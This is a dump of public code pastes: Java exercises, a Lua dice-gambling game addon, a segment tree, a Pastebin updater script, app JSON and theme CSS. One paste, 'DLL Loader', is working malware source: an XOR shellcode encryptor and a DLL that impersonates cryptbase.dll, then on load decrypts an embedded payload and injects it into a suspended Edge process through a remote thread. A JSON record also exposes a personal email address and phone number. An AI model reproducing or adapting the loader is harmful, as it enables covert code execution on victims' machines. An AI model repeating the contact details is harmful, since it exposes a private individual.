id,title,username,language,date,content
Zzw1T2xG,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 01:04:05 PM CDT,"import java.util.Random;

class Tocka {
    private double x;
    private double y;


    public Tocka(double x, double y) {
        this.x = x;
        this.y = y;
    }

    public double getX() {
        return x;
    }
    public double getY() {
        return y;
    }
    public void setX(double x) {
        this.x = x;
    }
    public void setY(double y) {
        this.y = y;
    }

}
public class Naloga14 {
    static Tocka sredina(Tocka a, Tocka b) {
        return new Tocka(0.5 * (a.getX() + b.getX()), 0.5 * (a.getY() + b.getY()));
    }
    public static void main(String[] args) {
        StdDraw.setScale(0, 100);
         Tocka[] tocki = new Tocka[3];
         tocki[0] = new Tocka(10, 10);
         tocki[1] = new Tocka(90, 10);
         tocki[2] = new Tocka(50, 90);

         Random random = new Random();

         int x = random.nextInt(100);
         int y;
         if(x < 50) {
            y = 2 * x + 1;
         }
         else {
            y = 2 * (100 - x)+ 1;
         }
         Tocka tocka = new Tocka(x, y);

         for(int i = 0; i < 10000; i++) {
            int j = random.nextInt(3);
            Tocka sredisnaTocka = sredina(tocki[j], tocka);

            StdDraw.line(sredisnaTocka.getX(), sredisnaTocka.getY(), sredisnaTocka.getX(), sredisnaTocka.getY());
            tocka = sredisnaTocka;
         }
    }
}
"
xuAMPwQ6,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 12:28:49 PM CDT,"import java.io.File;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Scanner;

class Drzava {
    private String kratenica;
    private String drzava;
    private int brojZiteli;

    public Drzava(String kratenica, String drzava, int brojZiteli) {
        this.kratenica = kratenica;
        this.drzava = drzava;
        this.brojZiteli = brojZiteli;
    }

    public String getKratenica() {
        return kratenica;
    }
    public String getDrzava() {
        return drzava;
    }
    public int getBrojZiteli() {
        return brojZiteli;
    }
    public void setKratenica(String kratenica) {
        this.kratenica = kratenica;
    }
    public void setDrzava(String drzava) {
        this.drzava = drzava;
    }
    public void setBroZiteli(int brojZiteli) {
        this.brojZiteli = brojZiteli;
    }
    public int presmetajMilioni() {
        return Math.round((float) brojZiteli / 1000000f);
    }
}
public class Naloga13 {
    static HashMap<String, Drzava> preberiDrzava(String imeDatoteke) {
        HashMap<String, Drzava> map = new HashMap<>();

        try {
            Scanner scanner = new Scanner(new File(imeDatoteke));
            while(scanner.hasNextLine()) {
                String line = scanner.nextLine();
                String[] niza = line.split("":"");
                map.put(niza[0], new Drzava(niza[0], niza[1], Integer.parseInt(niza[2])));
            }

        }
        catch(Exception e) {
            System.out.println(""Error "" + e);
        }

        return map;
    }
    public static void main(String[] args) {
        HashMap<String, Drzava> map = preberiDrzava(args[0]);
        ArrayList<String> keys = new ArrayList<>(map.keySet());

        keys.sort(new Comparator<String>() {
            @Override
            public int compare(String a, String b) {
                Drzava d1 = map.get(a);
                Drzava d2 = map.get(b);

                if(d1.presmetajMilioni() == d2.presmetajMilioni()) {
                    return d1.getDrzava().compareTo(d2.getDrzava());
                }
                
                return d1.presmetajMilioni() - d2.presmetajMilioni();
            }
        }); 
        
        int current_million = -1;
        for(int i = 0; i < keys.size(); i++) {
            String drzava = keys.get(i);

            Drzava d = map.get(drzava);

            if(current_million != d.presmetajMilioni()) {
                current_million = d.presmetajMilioni();
                System.out.println(current_million + ""M"");
            }
            System.out.println(""  - "" + d.getDrzava() + "" ("" + d.getKratenica() + ""), "" + d.getBrojZiteli());
        }
        
    }
}
"
fjibJ55t,Untitled,bebo231312312321,JavaScript,Tuesday 17th of June 2025 12:05:41 PM CDT,"{
    ""title"": ""dasdsadsa"",
    ""slug"": ""dasdsadsa"",
    ""shortDescription"": ""dsadsadsa"",
    ""mainImage"": {
        ""src"": """",
        ""alt"": """",
        ""caption"": """",
        ""gallery"": []
    },
    ""category"": ""Environment"",
    ""location"": {
        ""address"": ""бл. 28, ж.к. Разсадника-Коньовица, ж.к. Разсадник-Коньовица, София, Красна поляна, Столична, София-град, 1379, България"",
        ""coordinates"": {
            ""lat"": 42.69685314805044,
            ""lng"": 23.29135894775391
        }
    },
    ""status"": ""active"",
    ""campaignStatus"": ""open"",
    ""commentsEnabled"": true,
    ""contact"": {
        ""name"": ""dsadsa"",
        ""position"": ""dsadsa"",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779"",
        ""image"": """"
    },
    ""additionalContacts"": [],
    ""sections"": [
        {
            ""titleSlug"": ""section-1750178285037"",
            ""title"": ""dsadsa"",
            ""content"": ""<p>dsadsadsa</p>"",
            ""images"": [
                {
                    ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fsections%2Fsection-0%2F38b41824-0786-4cc9-8681-2f5eecf2fa11?alt=media&token=7705d07f-0816-4945-af3a-6b2620d53545"",
                    ""alt"": ""dsa"",
                    ""caption"": ""dasdsa"",
                    ""isUploading"": false
                }
            ]
        }
    ],
    ""downloadMaterials"": [],
    ""projects"": [],
    ""stories"": [],
    ""publications"": [],
    ""detailedDescription"": ""<p>dsadsadsadsadsadsa</p>"",
    ""customCategory"": """",
    ""priority"": ""Medium"",
    ""startDate"": ""2025-06-12"",
    ""endDate"": """",
    ""duration"": """",
    ""milestones"": [],
    ""targetAge"": [
        ""All ages""
    ],
    ""targetAudience"": [],
    ""customAudience"": ""dsadsadsasaas"",
    ""expectedBudget"": ""432"",
    ""currency"": ""BGN"",
    ""fundingSources"": [
        ""Sponsors"",
        ""Self-funded""
    ],
    ""partners"": [
        {
            ""id"": ""1750178329729-i6v2lpwet"",
            ""name"": ""dsadsasa"",
            ""description"": ""dsadsadsa"",
            ""website"": """",
            ""type"": ""Strategic"",
            ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fpartners%2F0a3832aa-7633-450b-819b-2981ab6e810d?alt=media&token=0b4a42a5-5536-4a92-9db0-f1006420e676"",
            ""visible"": true
        }
    ],
    ""sponsors"": [],
    ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Flogos%2F48c20117-36a9-4190-921b-34e2a7e46c85?alt=media&token=0e3ae544-2c73-485e-8495-8b1169b19792"",
    ""responsible"": {
        ""name"": ""dsasaddsa"",
        ""position"": """",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779""
    },
    ""organization"": {
        ""name"": ""dsasasad"",
        ""address"": ""dsadsadsaasdsadsadsa "",
        ""website"": """"
    },
    ""socialMedia"": {
        ""facebook"": """",
        ""instagram"": """",
        ""linkedin"": """",
        ""twitter"": """"
    },
    ""kpis"": [],
    ""expectedResults"": ""<p>dsadsadsa</p>"",
    ""progressReport"": ""<p>dsadsadsa</p>"",
    ""impactMetrics"": [],
    ""testimonials"": [],
    ""tags"": [],
    ""relatedInitiatives"": [],
    ""faq"": [],
    ""gallery"": [
        {
            ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fgallery%2Fc6ccd133-b77d-4150-8439-17533ce8fe6a?alt=media&token=3f2e0592-4441-420d-9f85-a22f7fdb82ce"",
            ""alt"": ""da"",
            ""caption"": ""dsadsasda"",
            ""isUploading"": false
        }
    ],
    ""createdAt"": ""2025-06-17T16:40:33.158Z"",
    ""updatedAt"": ""2025-06-17T16:40:33.158Z""
}"
6eTY9VY5,DiceGames.lua,Kaev,Lua,Tuesday 17th of June 2025 11:36:23 AM CDT,"-- Chat Config values
local TRADE_GOLD_RECEIVED_ANNOUNCEMENT = ""%s Bets %s!""; -- First %s is the players name, second %s is the gold amount
local TRADE_GOLD_GIVEN_ANNOUNCEMENT = ""%s received %s!""; -- First %s is the players name, second %s is the gold amount
local GOLD = ""%d Gold"";
local SILVER = ""%d Silver"";
local COPPER = ""%d Copper"";

-- Dice Config Values
local GAME_DICE_KEYWORD_OVER = ""over"";
local GAME_DICE_KEYWORD_UNDER = ""under"";
local GAME_DICE_WIN_MESSAGE = ""Congratulations %s! You won the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)
local GAME_DICE_LOSE_MESSAGE = ""Sorry %s! You lost the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)

-- Don't change anything below this line
local GAME_DICE_ROLL_COUNT = 2; -- Don't change! There is a hard check for the value 7 in this addon. Any change will break the game.

-- Prize Stuff
local OPEN_PRIZES = {};

local function AddOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = amount;
    else
        OPEN_PRIZES[playerName] = OPEN_PRIZES[playerName] + amount;
    end
end

local function HasOpenPrize(playerName)
    return OPEN_PRIZES[playerName] ~= nil and OPEN_PRIZES[playerName] > 0;
end

local function GetOpenPrize(playerName)
    return OPEN_PRIZES[playerName] or 0;
end

local function UpdateOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = 0;
        return;
    end

    OPEN_PRIZES[playerName] = math.max(0, OPEN_PRIZES[playerName] - amount);
end

-- Game stuff
local CURRENT_GAMES = {};

local function StartNewGame(playerName, betAmount)
    CURRENT_GAMES[playerName] = {
        gamemode = ""dice"",
        player = playerName,
        choice = nil, -- over or under
        bet = betAmount,
        rolls = {},
        total = 0,
        winner = nil
    };
end

local function RemoveFinishedGame(game)
    CURRENT_GAMES[game.player] = nil;
end

local function HasCurrentGame(playerName)
    return CURRENT_GAMES[playerName] ~= nil;
end

local function GetCurrentGame(playerName)
    return CURRENT_GAMES[playerName];
end

local function DoGameRolls(game)
    if (game.gamemode == ""dice"") then
        for i=1, GAME_DICE_ROLL_COUNT do
            RandomRoll(1, 6);
        end
    end
end

local function IsGameUnfinished(game)
    if (game.gamemode == ""dice"") then
        return game.winner == nil and game.choice ~= nil
    end
end

local function GetFirstUnfinishedGame()
    for playerName, game in pairs(CURRENT_GAMES) do
        if IsGameUnfinished(game) then
            return game;
        end
    end
    return nil;
end

local function AssignRollToGame(game, roll)
    if (game.gamemode == ""dice"") then
        game.rolls[#game.rolls + 1] = roll;
        game.total = game.total + roll;
    end
end

local function HandleGameLogic(game)
    if (game.gamemode == ""dice"") then
        if (#game.rolls < GAME_DICE_ROLL_COUNT) then
            return; -- Not enough rolls yet
        end

        if (game.choice == GAME_DICE_KEYWORD_OVER and game.total > 7) or (game.choice == GAME_DICE_KEYWORD_UNDER and game.total < 7) then
            game.winner = game.player;
            local msg = GAME_DICE_WIN_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
            AddOpenPrize(game.player, game.bet * 2);
            InitiateTrade(game.player);
        else
            game.winner = UnitName(""player"");
            local msg = GAME_DICE_LOSE_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
        end

        RemoveFinishedGame(game);
    end
end

-- Trade stuff
local ROLL_PATTERN = RANDOM_ROLL_RESULT
  :gsub(""[%-%(%)]"", ""%%%1"") -- Escape special chars
  :gsub(""%%%d%$s"", ""(%%S+)"") -- Prepare player name
  :gsub(""%%%d%$d"", ""(%%d+)"") -- Prepare roll numbers

local CURRENT_TRADE = {
    name = """",
    playerGold = 0,
    targetGold = 0
}

local function ResetCurrentTrade()
    CURRENT_TRADE.name = """";
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;
end

local function CopperToMoneyString(copper)
    if (copper == nil or copper <= 0) then
        return ""-Nothing-"";
    end

    local gold = math.floor(copper / 10000);
    local silver = math.floor((copper % 10000) / 100);
    local copper = copper % 100;
    return string.trim(string.format(""%s %s %s"", 
        gold > 0 and string.format(GOLD, gold) or """",
        silver > 0 and string.format(SILVER, silver) or """",
        copper > 0 and string.format(COPPER, copper) or """"));
end

local function TradeComplete()
    if (TRADE_GOLD_RECEIVED_ANNOUNCEMENT ~= """" and CURRENT_TRADE.targetGold > 0) then
        local msg = TRADE_GOLD_RECEIVED_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.targetGold));
        SendChatMessage(msg, ""YELL"");
    end

    if (TRADE_GOLD_GIVEN_ANNOUNCEMENT ~= """" and CURRENT_TRADE.playerGold > 0) then
        local msg = TRADE_GOLD_GIVEN_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.playerGold));
        SendChatMessage(msg, ""YELL"");
        UpdateOpenPrize(CURRENT_TRADE.name, tonumber(CURRENT_TRADE.playerGold));
    end

    if (CURRENT_TRADE.targetGold > 0) then
        StartNewGame(CURRENT_TRADE.name, CURRENT_TRADE.targetGold);
    end

    ResetCurrentTrade();
end

local function OnTradeRequestCancel()
    ResetCurrentTrade();
end

local function OnTradeShow()
    local traderName = strtrim(_G.TradeFrameRecipientNameText:GetText());
    ResetCurrentTrade();
    CURRENT_TRADE.name = traderName;
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;

    if (HasOpenPrize(traderName)) then
        local openPrize = GetOpenPrize(traderName);
        print(""Open prize found for ""..traderName.."": ""..CopperToMoneyString(openPrize));
    end
end

local function OnTradeMoneyChanged()
    CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
    CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
end

local function OnUiInfoMessage(message)
    if (message == ERR_TRADE_COMPLETE) then
        TradeComplete();
    end
end

local TIMER_ELAPSED = 0;
local function OnUpdate(elapsed)
    if (not TradeFrame:IsShown()) then
        return;
    end
    TIMER_ELAPSED = TIMER_ELAPSED + elapsed;
    if (TIMER_ELAPSED > 0.05) then
        CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
        CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
    end
end

-- General stuff
local function OnSystemMessage(message)
    local name, roll, min, max = message:match(ROLL_PATTERN)
    if name and name == UnitName(""player"") then -- Only handle rolls for us
        local game = GetFirstUnfinishedGame();
        if (game == nil) then
            return; -- No game to handle
        end
        AssignRollToGame(game, tonumber(roll));
        HandleGameLogic(game)
    end
end

local function OnChatMessage(message, playerName)
    if (HasCurrentGame(playerName)) then
        local lowerMessage = string.lower(message);
        if (lowerMessage == string.lower(GAME_DICE_KEYWORD_OVER) or lowerMessage == string.lower(GAME_DICE_KEYWORD_UNDER)) then
            local game = GetCurrentGame(playerName);
            game.choice = lowerMessage;
            DoGameRolls(game);
        end
    end
end

local eventHandlers = {
    [""CHAT_MSG_SYSTEM""] = OnSystemMessage,
    [""CHAT_MSG_SAY""] = OnChatMessage,
    [""TRADE_REQUEST_CANCEL""] = OnTradeRequestCancel,
    [""TRADE_SHOW""] = OnTradeShow,
    [""TRADE_MONEY_CHANGED""] = OnTradeMoneyChanged,
    [""UI_INFO_MESSAGE""] = OnUiInfoMessage
}

local frame = CreateFrame(""Frame"");
frame:RegisterEvent(""CHAT_MSG_SYSTEM"");
frame:RegisterEvent(""CHAT_MSG_SAY"");
frame:RegisterEvent(""TRADE_ACCEPT_UPDATE"");
frame:RegisterEvent(""TRADE_REQUEST_CANCEL"");
frame:RegisterEvent(""TRADE_SHOW"");
frame:RegisterEvent(""TRADE_CLOSED"");
frame:RegisterEvent(""TRADE_MONEY_CHANGED"");
frame:RegisterEvent(""UI_INFO_MESSAGE"")
frame:SetScript(""OnEvent"", function(self, event, ...)
    local args = {...};
    local eventHandler = eventHandlers[event];
    if eventHandler then
        eventHandler(unpack(args));
    end
end);
frame:HookScript(""OnUpdate"", function(self, elapsed)
    OnUpdate(elapsed);
end);

SLASH_DICEGAMES1 = ""/dicegames"";
SLASH_DICEGAMES2 = ""/dg"";
SlashCmdList[""DICEGAMES""] = function(message)
    print(""Open prizes:"");
    for player, amount in pairs(OPEN_PRIZES) do
        if (amount >= 1) then
            print(player.."": ""..CopperToMoneyString(amount));
        end
    end
    print(""Open games:"");
    for playerName, game in pairs(CURRENT_GAMES) do
        print(playerName, game, game.bet, game.choice);
    end
end"
wKSzqPWC,k-я единица ДО,nq1s788,C++,Tuesday 17th of June 2025 11:31:09 AM CDT,"int get(int t, int l, int r, int k) {
    if (r - l == 1) {
        return l;
    }
    int m = (r + l) / 2;
    if (k > tree[2 * t + 1]) {
        get(t * 2 + 2, m, r, k - tree[2 * t + 1]);
    } else {
        get(t * 2 + 1, l, m, k);
    }
}

void update(int t, int l, int r, int x) {
    if (x < l || r <= x) {
        return;
    }
    if (r - l == 1) {
        tree[t] ^= 1;
        return;
    }
    int m = (l + r) / 2;
    update(t * 2 + 1, l, m, x);
    update(t * 2 + 2, m, r, x);
    tree[t] = tree[t * 2 + 1] + tree[t * 2 + 2];
}"
m8jeRd4D,DLL Loader,EngEhabFahmi,C++,Tuesday 17th of June 2025 11:16:29 AM CDT,"// DLL Loader
// https://www.7-zip.org/download.html
// ===============================================================
// 1st file:
 
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
 
// Function to XOR encrypt the buffer using the provided key
void xorEncrypt(std::vector<unsigned char>& buf, const std::string& key) {
    size_t keyLen = key.length();
    for (size_t i = 0; i < buf.size(); ++i) {
        buf[i] ^= key[i % keyLen];
    }
}
 
int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << ""Usage: "" << argv[0] << "" <input_shellcode> <xor_key> <output_file>"" << std::endl;
        return 1;
    }
 
    std::string inputFile = argv[1];
    std::string key = argv[2];
    std::string outputFile = argv[3];
 
    // Open input shellcode file
    std::ifstream file(inputFile, std::ios::binary);
    if (!file) {
        std::cerr << ""Error: Cannot open input file."" << std::endl;
        return 1;
    }
 
    // Read the file into a buffer
    std::vector<unsigned char> buf((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
 
    if (buf.empty()) {
        std::cerr << ""Error: Input shellcode file is empty."" << std::endl;
        return 1;
    }
 
    // XOR encrypt the buffer
    xorEncrypt(buf, key);
 
    // Write XORed shellcode to output file
    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        std::cerr << ""Error: Cannot create output file."" << std::endl;
        return 1;
    }
 
    outFile.write(reinterpret_cast<char*>(buf.data()), buf.size());
    outFile.close();
 
    std::cout << ""[+] Shellcode encrypted and saved to: "" << outputFile << std::endl;
 
    return 0;
}
 
// ===============================================================
// 2nd File: 

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <thread>
#include <random>
#include ""resource.h""
 
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)
 
#pragma comment(linker, ""/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1"")
#pragma comment(linker, ""/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2"")
#pragma comment(linker, ""/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3"")
#pragma comment(linker, ""/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4"")
#pragma comment(linker, ""/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5"")
#pragma comment(linker, ""/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6"")
#pragma comment(linker, ""/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7"")
#pragma comment(linker, ""/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8"")
#pragma comment(linker, ""/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9"")
#pragma comment(linker, ""/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10"")
#pragma comment(linker, ""/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11"")
 
const char key[] = ""Uoajs2@ahiushidasd"";
 
 
// Enhanced debugging function with timestamp and process ID
void DebugLog(const char* msg, LPVOID ptr = nullptr) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf(""[%02d:%02d:%02d.%03d] [PID: %d] %s"",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        GetCurrentProcessId(), msg);
 
    if (ptr) {
        printf("" [Pointer: 0x%p]"", ptr);
    }
    printf(""\n"");
}
 
void PauseForDebug(const char* msg) {
    DebugLog(msg);
    std::cout << ""Press Enter to continue..."";
    std::cin.ignore();
}
 
void HexDump(const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    printf(""Hex dump (%zu bytes):\n"", size);
    for (size_t i = 0; i < size; ++i) {
        printf(""%02X "", p[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) {
            printf(""\n"");
        }
    }
}
 
void DecryptShellcode(BYTE* data, DWORD size) {
    //DebugLog(""Starting shellcode decryption..."");
    int keyLength = sizeof(key) - 1;
 
    //DebugLog(""Shellcode before decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
 
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % keyLength];
    }
 
    //DebugLog(""Shellcode after decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
    //DebugLog(""Shellcode decryption completed"");
}
 
void InjectShellcodeIntoNotepad() {
    DebugLog(""Starting shellcode injection process"");
 
    // Create notepad.exe process suspended
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
 
    if (!CreateProcess(L""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DebugLog(""[!] Failed to create notepad process!"");
        return;
    }
 
    DebugLog(""Notepad.exe created successfully (suspended)"");
    DebugLog(""Notepad process information:"", pi.hProcess);
    printf(""  Process ID: %d\n"", pi.dwProcessId);
    printf(""  Thread ID: %d\n"", pi.dwThreadId);
    PauseForDebug(""Notepad process created - check with Process Explorer"");
 
    HMODULE hModule = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)InjectShellcodeIntoNotepad, &hModule)) {
        DebugLog(""[!] Failed to get module handle!"");
        return;
    }
    DebugLog(""Module handle obtained:"", hModule);
    PauseForDebug(""Module handle fetched - ready to access resources"");
 
    // Find and load the resource
    DebugLog(""Locating resource..."");
    HRSRC resHandle = FindResource(hModule, MAKEINTRESOURCE(IDR_SHELL1), L""SHELL"");
    if (!resHandle) {
        DebugLog(""[!] Resource not found!"");
        return;
    }
    DebugLog(""Resource found:"", resHandle);
 
    DWORD resSize = SizeofResource(hModule, resHandle);
    HGLOBAL resData = LoadResource(hModule, resHandle);
    void* resPtr = LockResource(resData);
 
    if (!resPtr || resSize == 0) {
        DebugLog(""[!] Failed to load resource data!"");
        return;
    }
 
    DebugLog(""Resource loaded successfully"");
    printf(""  Resource size: %d bytes\n"", resSize);
    printf(""  Resource pointer: 0x%p\n"", resPtr);
    PauseForDebug(""Resource loaded - ready to process"");
 
    // Allocate memory for shellcode
    BYTE* pShellcode = (BYTE*)VirtualAlloc(0, resSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pShellcode == NULL) {
        DebugLog(""[!] Memory allocation failed!"");
        return;
    }
 
    DebugLog(""Memory allocated for shellcode:"", pShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Memory allocated - ready to copy shellcode"");
 
    // Copy resource data to allocated memory
    memcpy(pShellcode, resPtr, resSize);
    DebugLog(""Shellcode copied to allocated memory"");
    PauseForDebug(""Shellcode copied - ready to decrypt"");
 
    // Decrypt the shellcode
    //DebugLog(""Starting shellcode decryption..."");
    DecryptShellcode(pShellcode, resSize);
    //PauseForDebug(""Shellcode decrypted - ready to inject"");
 
    // Allocate memory in the notepad process
    LPVOID pRemoteShellcode = VirtualAllocEx(pi.hProcess, NULL, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteShellcode) {
        //DebugLog(""[!] Failed to allocate memory in target process!"");
        return;
    }
 
    DebugLog(""Memory allocated in Notepad process:"", pRemoteShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Remote memory allocated - ready to write shellcode"");
 
    // Write the decrypted shellcode into the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode, pShellcode, resSize, &bytesWritten)) {
        //DebugLog(""[!] Failed to write shellcode to Notepad process!"");
        return;
    }
 
    DebugLog(""Shellcode written to Notepad process"");
    printf(""  Bytes written: %zu/%d\n"", bytesWritten, resSize);
    PauseForDebug(""Shellcode written - ready to execute"");
 
    // Create a remote thread in the notepad process to execute the shellcode
    DebugLog(""Creating remote thread..."");
    system(""pause"");
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    if (!hThread) {
        //DebugLog(""[!] Failed to create remote thread!"");
        return;
    }
 
    DebugLog(""Remote thread created successfully:"", hThread);
    printf(""  Thread ID: %d\n"", GetThreadId(hThread));
    PauseForDebug(""Remote thread created - shellcode executing"");
 
    // Wait for the thread to complete (optional)
    DebugLog(""Waiting for shellcode execution to complete..."");
    //WaitForSingleObject(hThread, INFINITE);
 
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    DebugLog(""Shellcode execution completed"");
    printf(""  Exit code: 0x%08X\n"", exitCode);
 
    // Clean up
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
 
    // Free local shellcode memory
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    //DebugLog(""Injection process completed successfully"");
    //PauseForDebug(""EXITing...."");
}
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        DebugLog(""DLL attached to process"");
        //Sleep(12000);
        InjectShellcodeIntoNotepad();
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"
ZDcrJian,initupdate.lua,Ubidibity,Lua,Tuesday 17th of June 2025 11:12:24 AM CDT,"-- initupdate.lua: Downloads the latest init.lua from Pastebin

local function updateProgram(pastebinCode, programName)
  print(""Starting update process for "" .. programName .. ""..."")
  if fs.exists(programName) then
    print(""Deleting old version of "" .. programName .. ""..."")
    fs.delete(programName)
    if not fs.exists(programName) then
      print(""Old version deleted successfully."")
    else
      error(""Failed to delete old version of "" .. programName)
    end
  else
    print(""No old version of "" .. programName .. "" found."")
  end

  print(""Downloading new version from Pastebin..."")
  local success = shell.run(""pastebin"", ""get"", pastebinCode, programName)
  if success then
    print(""Successfully downloaded "" .. programName .. "" from Pastebin."")
    print(""Update complete! You can now run "" .. programName .. ""."")
  else
    error(""Failed to download "" .. programName .. "" from Pastebin. Check the Pastebin code or internet connection."")
  end
end

-- Update init.lua
local programName = ""init.lua""
local pastebinCode = ""ypw1WRQa"" -- Replace with actual Pastebin code
updateProgram(pastebinCode, programName)
"
Pgm84jfR,Untitled,Robhies,CSS,Tuesday 17th of June 2025 11:06:28 AM CDT,"/*! ClearVision v7.0.1 by ClearVision Team */@keyframes cv-channel-select{from{right:100%}to{right:0}}@keyframes cv-card-loading{0%{opacity:.66}50%{opacity:.33}100%{opacity:.66}}/*! ClearVision v7.0.1 by ClearVision Team */.info__2debe::after{content: none;color:var(--text-muted);font-size:12px;line-height:1.3333333333;font-weight:400;font-family:var(--font-primary)}.visual-refresh:not(.platform-osx) .leading_c38106::before{content:""ClearVision"";position:static;margin-left:10px;font-size:16px;font-weight:600;color:var(--text-normal);order:2;filter:drop-shadow(0 0 5px var(--hsl-main-color))}.visual-refresh:not(.platform-osx) .leading_c38106::after{content:""7.0.1"";position:static;margin-top:-5px;margin-left:5px;font-family:var(--code-font);font-size:11px;font-weight:600;color:var(--text-muted);order:3}/*! ClearVision v7.0.1 by ClearVision Team */.button__201d5{border-radius:4px}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5){background-color:var(--hsl-main-color);border:none}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):hover{background-color:var(--hsl-hover-color)}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):disabled{background-color:var(--hsl-main-color)}.lookFilled__201d5.colorGreen__201d5{background-color:var(--hsl-success-color);border:none}.lookFilled__201d5.colorGreen__201d5:hover{background-color:hsl(from var(--hsl-success-color) h s l/0.8)}.lookFilled__201d5.colorGreen__201d5:disabled{background-color:hsl(from var(--hsl-success-color) h s l/0.8)}.lookFilled__201d5.colorRed__201d5{background-color:var(--hsl-danger-color);border:none}.lookFilled__201d5.colorRed__201d5:hover{background-color:hsl(from var(--hsl-danger-color) h s l/0.8)}.lookFilled__201d5.colorRed__201d5:disabled{background-color:var(--hsl-danger-color)}.lookFilled__201d5:is(.colorWhite__201d5,.colorBrandInverted__201d5){color:var(--hsl-main-color);border:none}.lookFilled__201d5:is(.colorWhite__201d5,.colorBrandInverted__201d5):hover{color:var(--hsl-hover-color)}.lookOutlined__201d5:is(.colorBrand__201d5,.colorPrimary__201d5){border-color:var(--hsl-main-color)}.lookOutlined__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):hover{border-color:var(--hsl-hover-color);background-color:var(--hsl-hover-color)}.lookOutlined__201d5.colorGreen__201d5{border-color:var(--hsl-success-color)}.lookOutlined__201d5.colorGreen__201d5:hover{border-color:hsl(from var(--hsl-success-color) h s l/0.8);background-color:hsl(from var(--hsl-success-color) h s 